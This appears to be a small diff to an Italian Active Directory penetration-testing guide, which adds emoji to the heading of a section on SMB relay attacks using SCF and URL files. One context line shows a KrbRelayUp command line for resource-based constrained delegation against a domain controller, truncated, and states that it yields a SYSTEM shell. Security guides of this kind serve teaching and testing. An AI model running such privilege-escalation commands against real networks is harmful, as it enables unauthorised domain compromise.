@@ -186,7 +186,7 @@ PS C:\temp> KrbRelayUp.exe spawn -m rbcd -d company.work -dc DC1.company.work -c
 ➤ Completato questi passaggi una shell nt authority/system comparirà
 
 -----------------
-### Attacco 6. SMB Relay attacks using SCF and URL files
+### Attacco 6. SMB Relay attacks using SCF and URL files 🕸🧑🏼‍💻
 
 #### Teoria
 
